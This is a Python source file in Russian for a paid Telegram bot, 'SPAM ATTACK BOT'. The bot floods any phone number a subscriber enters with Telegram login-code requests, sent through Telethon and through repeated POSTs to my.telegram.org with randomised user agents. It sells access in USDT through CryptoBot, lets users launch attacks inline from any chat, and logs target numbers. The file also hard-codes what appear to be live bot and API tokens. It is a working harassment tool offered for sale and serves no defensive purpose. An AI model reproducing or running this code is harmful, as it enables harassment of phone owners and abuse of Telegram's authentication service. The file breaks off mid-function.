#!/usr/bin/env python3
"""
SPAM ATTACK BOT - Атака кодами Telegram
С поддержкой inline-режима в чатах
"""

import telebot
from telebot import types
import requests
import fake_useragent
import json
import datetime
import time
import sqlite3
import threading
import logging
import asyncio
import os
import re
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError
import phonenumbers
from cryptobot_api import Api
import random
from typing import List, Dict

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = '8265400671:AAEwAYxUdNGpOMPfHeqslx2K9U4mwYxieDg'
CRYPTOBOT_TOKEN = '505975:AAWB2WYvz4wJuseOm4nrs875jo4ORUJl7ww'
ADMIN_ID = 7037764178  # Ваш Telegram ID
API_ID = 30147101
API_HASH = '72c394e899371cf4f9f9253233cbf18f'
DATABASE_NAME = 'users.db'

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
crypto_api = Api(CRYPTOBOT_TOKEN) if CRYPTOBOT_TOKEN else None

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Баннер (можно менять в админке)
BANNER = """
╔══════════════════════════════════════╗
║  🚀 SPAM ATTACK BOT                 ║
║  Атака кодами Telegram              ║
╚══════════════════════════════════════╝
"""

# ==================== БАЗА ДАННЫХ ====================
def init_database():
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            join_date TEXT,
            subscription_end TEXT,
            subscription_type TEXT,
            total_attacks INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0,
            last_activity TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            invoice_id TEXT PRIMARY KEY,
            user_id INTEGER,
            amount REAL,
            status TEXT,
            subscription_type TEXT,
            created_at TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone_number TEXT,
            requests_sent INTEGER,
            status TEXT,
            timestamp TEXT,
            is_inline INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS inline_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            query TEXT,
            timestamp TEXT
        )
    ''')
    
    # Настройки по умолчанию
    cursor.execute('''
        INSERT OR IGNORE INTO settings (key, value) 
        VALUES ('banner', ?), 
               ('welcome_text', 'Добро пожаловать в Spam Attack Bot!'),
               ('inline_description', 'Атака кодами на номер телефона')
    ''', (BANNER,))
    
    conn.commit()
    conn.close()
    logger.info("База данных создана")

def get_setting(key):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute('SELECT value FROM settings WHERE key = ?', (key,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def update_setting(key, value):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, value))
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT OR IGNORE INTO users (user_id, username, first_name, join_date, subscription_end, last_activity)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, datetime.datetime.now().isoformat(), 
          '2000-01-01', datetime.datetime.now().isoformat()))
    
    conn.commit()
    conn.close()

def update_user_activity(user_id):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET last_activity = ? WHERE user_id = ?', 
                   (datetime.datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def check_subscription(user_id):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    
    cursor.execute('SELECT subscription_end, is_banned FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        return False
    
    end_date = datetime.datetime.fromisoformat(result[0])
    is_banned = result[1] == 1
    
    if is_banned:
        return False
    
    return end_date > datetime.datetime.now()

def get_user_subscription_type(user_id):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute('SELECT subscription_type FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def update_subscription(user_id, subscription_type):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    
    if subscription_type == 'forever':
        end_date = '2100-01-01'
    elif subscription_type == '30days':
        end_date = (datetime.datetime.now() + datetime.timedelta(days=30)).isoformat()
    else:
        end_date = (datetime.datetime.now() + datetime.timedelta(days=7)).isoformat()
    
    cursor.execute('''
        UPDATE users 
        SET subscription_end = ?, subscription_type = ?
        WHERE user_id = ?
    ''', (end_date, subscription_type, user_id))
    
    conn.commit()
    conn.close()

# ==================== ОПЛАТА ====================
def create_invoice(user_id, amount, subscription_type):
    try:
        if not crypto_api:
            return {'success': False, 'error': 'CryptoBot не настроен'}
        
        invoice = crypto_api.createInvoice(
            asset='USDT',
            amount=amount,
            description=f'Подписка {subscription_type}'
        )
        
        if invoice.get('ok'):
            conn = sqlite3.connect(DATABASE_NAME)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO payments (invoice_id, user_id, amount, status, subscription_type, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (invoice['result']['invoice_id'], user_id, amount, 'pending', subscription_type, 
                  datetime.datetime.now().isoformat()))
            conn.commit()
            conn.close()
            
            return {
                'success': True,
                'pay_url': invoice['result']['pay_url'],
                'invoice_id': invoice['result']['invoice_id']
            }
    except Exception as e:
        logger.error(f"Ошибка создания счета: {e}")
    
    return {'success': False}

def check_payment(invoice_id):
    try:
        if not crypto_api:
            return None
        
        invoices = crypto_api.getInvoices(invoice_ids=invoice_id)
        if invoices.get('ok') and invoices['result']['items']:
            return invoices['result']['items'][0]['status']
    except Exception as e:
        logger.error(f"Ошибка проверки платежа: {e}")
    
    return None

# ==================== АТАКА ====================
async def send_code_request_async(phone):
    """Асинхронная отправка кода через Telethon"""
    try:
        session_name = f'session_{int(time.time())}_{random.randint(1000, 9999)}'
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        await client.connect()
        result = await client.send_code_request(phone)
        await client.disconnect()
        
        return True
    except Exception as e:
        logger.error(f"Ошибка Telethon: {e}")
        return False

def send_code_request_sync(phone):
    """Синхронная отправка кода"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(send_code_request_async(phone))
        return result
    finally:
        loop.close()

def spam_attack(phone, is_inline=False):
    """Основная функция атаки"""
    user_agent = fake_useragent.UserAgent().random
    headers = {'User-Agent': user_agent}
    
    urls = [
        ('https://my.telegram.org/auth/send_password', {'phone': phone}),
        ('https://my.telegram.org/auth/send_password', {'phone': phone}),
        ('https://my.telegram.org/auth/send_password', {'phone': phone}),
    ]
    
    success_count = 0
    start_time = time.time()
    
    # Для inline режима делаем меньше запросов
    max_requests = 15 if is_inline else 20
    
    for i in range(max_requests):
        # Telethon запрос
        if send_code_request_sync(phone):
            success_count += 1
        
        # HTTP запросы
        for url, data in urls:
            try:
                response = requests.post(url, headers=headers, data=data, timeout=5)
                if response.status_code == 200:
                    success_count += 1
            except:
                pass
        
        time.sleep(0.5)
    
    duration = time.time() - start_time
    return success_count, duration

# ==================== INLINE РЕЖИМ ====================
def save_inline_query(user_id, query):
    """Сохраняем историю inline запросов"""
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO inline_usage (user_id, query, timestamp)
        VALUES (?, ?, ?)
    ''', (user_id, query, datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_inline_history(user_id, limit=10):
    """Получаем историю inline запросов"""
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT query FROM inline_usage 
        WHERE user_id = ? 
        ORDER BY timestamp DESC 
        LIMIT ?
    ''', (user_id, limit))
    results = cursor.fetchall()
    conn.close()
    return [r[0] for r in results]

# ==================== КНОПКИ ====================
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    btn1 = types.KeyboardButton('🎯 Начать атаку')
    btn2 = types.KeyboardButton('💰 Подписка')
    btn3 = types.KeyboardButton('📊 Статистика')
    btn4 = types.KeyboardButton('🆘 Помощь')
    
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def subscription_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn1 = types.InlineKeyboardButton('7 дней - 1$', callback_data='buy_7days')
    btn2 = types.InlineKeyboardButton('30 дней - 8$', callback_data='buy_30days')
    btn3 = types.InlineKeyboardButton('Навсегда - 25$', callback_data='buy_forever')
    btn4 = types.InlineKeyboardButton('Проверить оплату', callback_data='check_payment')
    
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def admin_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn1 = types.InlineKeyboardButton('📊 Статистика', callback_data='admin_stats')
    btn2 = types.InlineKeyboardButton('👥 Пользователи', callback_data='admin_users')
    btn3 = types.InlineKeyboardButton('⚙️ Настройки', callback_data='admin_settings')
    btn4 = types.InlineKeyboardButton('📢 Рассылка', callback_data='admin_broadcast')
    btn5 = types.InlineKeyboardButton('➕ Подписка', callback_data='admin_add_sub')
    btn6 = types.InlineKeyboardButton('➖ Удалить подписку', callback_data='admin_remove_sub')
    btn7 = types.InlineKeyboardButton('🎯 Атаки', callback_data='admin_attacks')
    btn8 = types.InlineKeyboardButton('💰 Финансы', callback_data='admin_finance')
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8)
    return markup

def back_button():
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton('🔙 Назад', callback_data='back')
    markup.add(btn)
    return markup

def inline_attack_button(phone):
    """Кнопка для inline режима"""
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton('⚡️ Начать атаку', callback_data=f'inline_attack_{phone}')
    markup.add(btn)
    return markup

# ==================== ОСНОВНЫЕ КОМАНДЫ ====================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    add_user(user_id, username, first_name)
    update_user_activity(user_id)
    
    banner = get_setting('banner') or BANNER
    welcome = get_setting('welcome_text') or "Добро пожаловать в Spam Attack Bot!"
    
    text = f"""
<pre>{banner}</pre>

<b>{welcome}</b>

👋 Привет, <b>{first_name}</b>!

Этот бот позволяет отправлять спам-коды на указанный номер телефона.

✨ <b>Основные функции:</b>
• Отправка множества кодов на номер
• Простой и понятный интерфейс
• Безопасная оплата через CryptoBot
• Подписка с разными сроками
• <b>Inline режим</b> - используйте @{bot.get_me().username} в любом чате

👇 <b>Выберите действие:</b>
    """
    
    bot.send_message(message.chat.id, text, reply_markup=main_menu())

@bot.message_handler(func=lambda m: m.text == '🎯 Начать атаку')
def start_attack_cmd(message):
    user_id = message.from_user.id
    
    update_user_activity(user_id)
    
    if not check_subscription(user_id):
        bot.send_message(
            message.chat.id,
            "❌ <b>Нет активной подписки</b>\n\n"
            "Чтобы использовать бота, нужно купить подписку.\n"
            "Нажмите кнопку <b>💰 Подписка</b>.",
            reply_markup=main_menu()
        )
        return
    
    bot.send_message(
        message.chat.id,
        "📱 <b>Введите номер телефона:</b>\n\n"
        "Формат: <code>+79123456789</code>\n"
        "Пример: <code>+79991234567</code>",
        reply_markup=back_button()
    )
    
    bot.register_next_step_handler(message, process_phone)

def process_phone(message):
    if message.text == '🔙 Назад':
        bot.send_message(message.chat.id, "Возвращаемся в меню...", reply_markup=main_menu())
        return
    
    phone = message.text.strip()
    
    try:
        parsed = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed):
            bot.send_message(
                message.chat.id,
                "❌ <b>Неверный номер</b>\n\n"
                "Проверьте правильность номера и попробуйте снова.",
                reply_markup=back_button()
            )
            return
    except:
        bot.send_message(
            message.chat.id,
            "❌ <b>Ошибка в номере</b>\n\n"
            "Используйте международный формат.",
            reply_markup=back_button()
        )
        return
    
    # Подтверждение
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton('✅ Начать атаку', callback_data=f'attack_{phone}')
    btn2 = types.InlineKeyboardButton('❌ Отмена', callback_data='cancel_attack')
    markup.add(btn1, btn2)
    
    bot.send_message(
        message.chat.id,
        f"🎯 <b>Подтверждение атаки</b>\n\n"
        f"Номер: <code>{phone}</code>\n\n"
        f"⚠️ <b>Внимание:</b> Начнется отправка кодов на этот номер.",
        reply_markup=markup
    )

@bot.message_handler(func=lambda m: m.text == '💰 Подписка')
def subscription_cmd(message):
    user_id = message.from_user.id
    update_user_activity(user_id)
    
    has_sub = check_subscription(user_id)
    
    if has_sub:
        conn = sqlite3.connect(DATABASE_NAME)
        cursor = conn.cursor()
        cursor.execute('SELECT subscription_type, subscription_end FROM users WHERE user_id = ?', (user_id,))
        sub_type, sub_end = cursor.fetchone()
        conn.close()
        
        end_date = datetime.datetime.fromisoformat(sub_end)
        days_left = (end_date - datetime.datetime.now()).days
        
        text = f"""
✅ <b>Ваша подписка активна</b>

📅 Тип: <b>{sub_type}</b>
⏳ Осталось дней: <b>{days_left}</b>
📆 Действует до: <b>{end_date.strftime('%d.%m.%Y')}</b>

👇 <b>Для продления выберите тариф:</b>
        """
    else:
        text = """
💰 <b>Выбор подписки</b>

Выберите срок подписки:

⚡️ <b>7 дней</b> - 1$
   • Доступ ко всем функциям
   • Неограниченные атаки

🚀 <b>30 дней</b> - 8$
   • Все функции доступны
   • Приоритетная работа

👑 <b>Навсегда</b> - 25$
   • Пожизненный доступ
   • Максимальная скорость

👇 <b>Выберите тариф:</b>
        """
    
    bot.send_message(message.chat.id, text, reply_markup=subscription_menu())

@bot.message_handler(func=lambda m: m.text == '📊 Статистика')
def stats_cmd(message):
    user_id = message.from_user.id
    update_user_activity(user_id)
    
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    
    cursor.execute('SELECT total_attacks, subscription_type FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if result:
        total_attacks, sub_type = result
        
        # Атаки сегодня
        today = datetime.datetime.now().date().isoformat()
        cursor.execute('SELECT COUNT(*) FROM attacks WHERE user_id = ? AND date(timestamp) = ?', (user_id, today))
        today_attacks = cursor.fetchone()[0]
        
        # Inline использование
        cursor.execute('SELECT COUNT(*) FROM inline_usage WHERE user_id = ?', (user_id,))
        inline_uses = cursor.fetchone()[0]
        
        has_sub = check_subscription(user_id)
        
        text = f"""
📊 <b>Ваша статистика</b>

👤 ID: <code>{user_id}</code>
🎯 Всего атак: <b>{total_attacks}</b>
📅 Атак сегодня: <b>{today_attacks}</b>
🔍 Inline использовано: <b>{inline_uses}</b>
💎 Подписка: <b>{"✅ Активна" if has_sub else "❌ Нет"}</b>
📋 Тип: <b>{sub_type or "Нет"}</b>
        """
    else:
        text = "❌ Статистика не найдена"
    
    conn.close()
    bot.send_message(message.chat.id, text, reply_markup=back_button())

@bot.message_handler(func=lambda m: m.text == '🆘 Помощь')
def help_cmd(message):
    update_user_activity(message.from_user.id)
    
    text = """
🆘 <b>Помощь и поддержка</b>

<b>Как работает бот:</b>
1. Покупаете подписку
2. Вводите номер телефона
3. Бот отправляет коды на этот номер
4. На номер приходят SMS с кодами

<b>Inline режим:</b>
Используйте @{bot.get_me().username} в любом чате!
Например: @{bot.get_me().username} +79123456789

<b>Частые вопросы:</b>

❓ <b>Как купить подписку?</b>
• Нажмите кнопку "💰 Подписка"
• Выберите срок
• Оплатите через CryptoBot
• Проверьте оплату

❓ <b>Сколько кодов отправляется?</b>
• За одну атаку отправляется 20-30 запросов
• На номер придет несколько SMS

❓ <b>Безопасно ли это?</b>
• Бот использует официальные методы
• Никаких взломов или обходов защиты

<b>Поддержка:</b> @username

<b>Важно:</b> Используйте бот ответственно.
    """.format(bot=bot)
    
    bot.send_message(message.chat.id, text, reply_markup=back_button())

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    update_user_activity(message.from_user.id)
    
    bot.send_message(
        message.chat.id,
        "👑 <b>Админ панель</b>\n\n"
        "Выберите действие:",
        reply_markup=admin_menu()
    )

# ==================== INLINE HANDLER ====================
@bot.inline_handler(lambda query: True)
def inline_query_handler(inline_query):
    """Обработчик inline запросов"""
    user_id = inline_query.from_user.id
    query = inline_query.query.strip()
    
    # Сохраняем запрос в историю
    save_inline_query(user_id, query)
    
    # Проверяем подписку
    has_subscription = check_subscription(user_id)
    
    # Получаем историю запросов
    history = get_inline_history(user_id, limit=5)
    
    results = []
    
    if not has_subscription:
        # Если нет подписки - показываем сообщение о необходимости подписки
        result = types.InlineQueryResultArticle(
            id='1',
            title='❌ Нет активной подписки',
            description='Купите подписку для использования inline режима',
            input_message_content=types.InputTextMessageContent(
                message_text='❌ Для использования inline режима нужна активная подписка.\n'
                            f'Перейдите в @{bot.get_me().username} для покупки.'
            ),
            reply_markup=types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton('💰 Купить подписку', url=f't.me/{bot.get_me().username}?start=subscribe')
            )
        )
        results.append(result)
    
    elif query:
        # Проверяем, похоже ли на номер телефона
        phone_pattern = r'^\+?[0-9\s\-\(\)]+$'
        if re.match(phone_pattern, query) and len(query) > 7:
            phone = query
            
            # Проверяем валидность номера
            try:
                parsed = phonenumbers.parse(phone, None)
                if phonenumbers.is_valid_number(parsed):
                    # Предлагаем начать атаку
                    result = types.InlineQueryResultArticle(
                        id='1',
                        title=f'⚡️ Атаковать номер {phone}',
                        description='Нажмите для запуска атаки кодами',
                        input_message_content=types.InputTextMessageContent(
                            message_text=f'🎯 <b>Запуск атаки на номер:</b> <code>{phone}</code>\n\n'
                                        '⚠️ Атака начата. На номер будут отправлены коды.'
                        ),
                        reply_markup=inline_attack_button(phone)
                    )
                    results.append(result)
            except:
                pass
        
        # Если не номер, показываем подсказки
        if not results:
            result = types.InlineQueryResultArticle(
                id='1',
                title='🔍 Введите номер телефона',
                description='Пример: +79123456789',
                input_message_content=types.InputTextMessageContent(
                    message_text='Введите номер телефона для атаки в формате +79123456789'
                )
            )
            results.append(result)
    
    else:
        # Пустой запрос - показываем подсказки
        if history:
            for i, hist_query in enumerate(history[:3]):
                result = types.InlineQueryResultArticle(
                    id=str(i+1),
                    title=f'📞 {hist_query}',
                    description='Нажмите для повторной атаки',
                    input_message_content=types.InputTextMessageContent(
                        message_text=f'🎯 <b>Запуск атаки на номер:</b> <code>{hist_query}</code>\n\n'
                                    '⚠️ Атака начата. На номер будут отправлены коды.'
                    ),
                    reply_markup=inline_attack_button(hist_query)
                )
                results.append(result)
        
        # Добавляем инструкцию
        help_result = types.InlineQueryResultArticle(
            id='help',
            title='ℹ️ Как использовать',
            description='Введите номер телефона для атаки',
            input_message_content=types.InputTextMessageContent(
                message_text=f'🔍 <b>Использование inline режима:</b>\n\n'
                            f'1. Напишите @{bot.get_me().username} в любом чате\n'
                            f'2. Введите номер телефона\n'
                            f'3. Выберите результат\n'
                            f'4. Сообщение отправится в чат\n\n'
                            f'<i>Требуется активная подписка</i>'
            )
        )
        results.append(help_result)
    
    try:
        bot.answer_inline_query(inline_query.id, results, cache_time=1)
    except Exception as e:
        logger.error(f"Ошибка inline запроса: {e}")

# ==================== CALLBACK ОБРАБОТКА ====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    
    update_user_activity(user_id)
    
    if call.data == 'back':
        bot.delete_message(chat_id, message_id)
        bot.send_message(chat_id, "Главное меню:", reply_markup=main_menu())
        return
    
    # Покупка подписки
    elif call.data.startswith('buy_'):
        sub_type = call.data[4:]
        
        prices = {'7days': 1, '30days': 8, 'forever': 25}
        amount = prices.get(sub_type, 1)
        
        invoice = create_invoice(user_id, amount, sub_type)
        
        if invoice['success']:
            markup = types.InlineKeyboardMarkup()
            btn1 = types.InlineKeyboardButton('💳 Оплатить', url=invoice['pay_url'])
            btn2 = types.InlineKeyboardButton('✅ Проверить', callback_data=f'check_{invoice["invoice_id"]}')
            markup.add(btn1, btn2)
            
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"""
💳 <b>Оплата подписки</b>

Сумма: <b>{amount}$</b>
Тариф: <b>{sub_type}</b>
ID платежа: <code>{invoice['invoice_id']}</code>

👇 <b>Действия:</b>
1. Нажмите "Оплатить"
2. Оплатите в CryptoBot
3. Нажмите "Проверить"
                """,
                reply_markup=markup
            )
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка создания счета")
    
    # Проверка оплаты
    elif call.data.startswith('check_'):
        invoice_id = call.data[6:]
        status = check_payment(invoice_id)
        
        if status == 'paid':
            # Находим тип подписки
            conn = sqlite3.connect(DATABASE_NAME)
            cursor = conn.cursor()
            cursor.execute('SELECT subscription_type FROM payments WHERE invoice_id = ?', (invoice_id,))
            result = cursor.fetchone()
            
            if result:
                sub_type = result[0]
                update_subscription(user_id, sub_type)
                
                cursor.execute('UPDATE payments SET status = ? WHERE invoice_id = ?', ('paid', invoice_id))
                conn.commit()
                conn.close()
                
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text="✅ <b>Оплата подтверждена!</b>\n\nПодписка активирована. Теперь можно использовать бота.",
                    reply_markup=back_button()
                )
            else:
                bot.answer_callback_query(call.id, "❌ Платеж не найден")
        else:
            bot.answer_callback_query(call.id, "⏳ Оплата еще не поступила")
    
    # Начало атаки из основного режима
    elif call.data.startswith('attack_'):
        phone = call.data[7:]
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"⚡️ <b>Начинаю атаку...</b>\n\nНомер: <code>{phone}</code>\n\n⏳ Подождите 10-15 секунд...",
            reply_markup=None
        )
        
        # Запуск в отдельном потоке
        def run_attack():
            try:
                requests_sent, duration = spam_attack(phone, is_inline=False)
                
                # Сохраняем в базу
                conn = sqlite3.connect(DATABASE_NAME)
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO attacks (user_id, phone_number, requests_sent, status, timestamp, is_inline)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (user_id, phone, requests_sent, 'completed', datetime.datetime.now().isoformat(), 0))
                
                cursor.execute('UPDATE users SET total_attacks = total_attacks + 1 WHERE user_id = ?', (user_id,))
                conn.commit()
                conn.close()
                
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=f"""
✅ <b>Атака завершена!</b>

📱 Номер: <code>{phone}</code>
📊 Запросов отправлено: <b>{requests_sent}</b>
⏱ Время: <b>{duration:.1f} сек</b>
🎯 Статус: <b>Успешно</b>

Атака выполнена. На номер отправлены коды.
                    """,
                    reply_markup=back_button()
                )
                
            except Exception as e:
                logger.error(f"Ошибка атаки: {e}")
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=f"❌ <b>Ошибка атаки:</b>\n\n{str(e)}",
                    reply_markup=back_button()
                )
        
        thread = threading.Thread(target=run_attack)
        thread.start()
    
    # Начало атаки из inline режима
    elif call.data.startswith('inline_attack_'):
        phone = call.data[14:]
        
        # Проверяем подписку
        if not check_subscription(user_id):
            bot.answer_callback_query(
                call.id,
                "❌ Нет активной подписки! Купите подписку в боте.",
                show_alert=True
            )
            return
        
        # Обновляем текст сообщения в чате
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"⚡️ <b>Запуск атаки...</b>\n\nНомер: <code>{phone}</code>\n\n⏳ Атака начата, подождите...",
            reply_markup=None
        )
        
        # Запуск атаки в отдельном потоке
        def run_inline_attack():
            try:
                requests_sent, duration = spam_attack(phone, is_inline=True)
                
                # Сохраняем в базу
                conn = sqlite3.connect(DATABASE_NAME)
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO attacks (user_id, phone_number, requests_sent, status, timestamp, is_inline)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (user_id, phone, requests_sent, 'completed', datetime.datetime.now().isoformat(), 1))
                
                cursor.execute('UPDATE users SET total_attacks = total_attacks + 1 WHERE user_id = ?', (user_id,))
                conn.commit()
                conn.close()
                
                # Обновляем сообщение в чате
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=f"""
✅ <b>Атака завершена!</b>

📱 Номер: <code>{phone}</code>
📊 Запросов отправлено: <b>{requests_sent}</b>
⏱ Время: <b>{duration:.1f} сек</b>
👤 От: <b>@{call.from_user.username or 'Пользователь'}</b>

Атака выполнена через inline режим.
                    """,
                    reply_markup=None
                )
                
            except Exception as e:
                logger.error(f"Ошибка inline атаки: {e}")
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=f"❌ <b>Ошибка атаки:</b>\n\n{str(e)}",
                    reply_markup=None
                )
        
        thread = threading.Thread(target=run_inline_attack)
        thread.start()
        bot.answer_callback_query(call.id, "⚡️ Атака запущена!")
    
    # Отмена атаки
    elif call.data == 'cancel_attack':
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="❌ <b>Атака отменена</b>",
            reply_markup=back_button()
        )
    
    # Админ меню
    elif call.data == 'admin_stats':
        conn = sqlite3.connect(DATABASE_NAME)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM users WHERE subscription_end > datetime("now")')
        active_subs = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM attacks')
        total_attacks = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM attacks WHERE is_inline = 1')
        inline_attacks = cursor.fetchone()[0]
        
        cursor.execute('SELECT SUM(amount) FROM payments WHERE status = "paid"')
        total_income = cursor.fetchone()[0] or 0
        
        conn.close()
        
        text = f"""
📊 <b>Статистика бота</b>

👥 Пользователей: <b>{total_users}</b>
✅ Активных подписок: <b>{active_subs}</b>
🎯 Всего атак: <b>{total_attacks}</b>
🔍 Inline атак: <b>{inline_attacks}</b>
💰 Общий доход: <b>{total_income:.2f}$</b>
🕐 Дата: <b>{datetime.datetime.now().strftime("%d.%m.%Y %H:%M")}</b>
        """
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=admin_menu()
        )
    
    elif call.data == 'admin_users':
        conn = sqlite3.connect(DATABASE_NAME)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT user_id, username, first_name, subscription_type, total_attacks 
            FROM users 
            ORDER BY join_date DESC 
            LIMIT 20
        ''')
        
        users = cursor.fetchall()
        conn.close()
        
        if users:
            text = "👥 <b>Последние пользователи</b>\n\n"
            for user in users:
                user_id, username, first_name, sub_type, attacks = user
                text += f"• <b>{first_name}</b> (@{username or 'нет'})\n"
                text += f"  ID: <code>{user_id}</code>\n"
                text += f"  Подписка: {sub_type or 'Нет'}\n"
                text += f"  Атак: {attacks}\n\n"
        else:
            text = "❌ Пользователей нет"
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=admin_menu()
        )
    
    elif call.data == 'admin_settings':
        text = """
⚙️ <b>Настройки бота</b>

👇 <b>Выберите что изменить:</b>
        """
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton('✏️ Баннер', callback_data='admin_edit_banner')
        btn2 = types.InlineKeyboardButton('📝 Приветствие', callback_data='admin_edit_welcome')
        btn3 = types.InlineKeyboardButton('🔙 Назад', callback_data='admin_back')
        markup.add(btn1, btn2, btn3)
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=markup
        )
    
    elif call.data == 'admin_edit_banner':
        msg = bot.send_message(
            chat_id,
            "✏️ <b>Введите новый баннер:</b>\n\n"
            "Используйте <code><pre>текст</pre></code> для форматирования.\n"
            "Отправьте сообщение с новым баннером:",
            reply_markup=back_button()
        )
        
        bot.register_next_step_handler(msg, save_new_banner)
    
    elif call.data == 'admin_back':
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="👑 <b>Админ панель</b>\n\nВыберите действие:",
            reply_markup=admin_menu()
        )
    
    elif call.data == 'admin_broadcast':
        msg = bot.send_message(
            chat_id,
            "📢 <b>Рассылка сообщений</b>\n\n"
            "Введите сообщение для рассылки всем пользователям:",
            reply_markup=back_button()
        )
        
        bot.register_next_step_handler(msg, process_broadcast)
    
    elif call.data == 'admin_add_sub':
        msg = bot.send_message(
            chat_id,
            "➕ <b>Выдача подписки</b>\n\n"
            "Введите ID пользователя и срок через пробел:\n"
            "Пример: <code>123456789 30days</code>",
            reply_markup=back_button()
        )
        
        bot.register_next_step_handler(msg, process_add_sub)

def save_new_banner(message):
    if message.text == '🔙 Назад':
        bot.send_message(message.chat.id, "Отменено", reply_markup=admin_menu())
        return
    
    update_setting('banner', message.text)
    bot.send_message(
        message.chat.id,
        "✅ <b>Баннер обновлен!</b>\n\nНовый баннер будет отображаться при команде /start",
        reply_markup=admin_menu()
    )

def process_broadcast(message):
    if message.text == '🔙 Назад':
        bot.send_message(message.chat.id, "Отменено", reply_markup=admin_menu())
        return
    
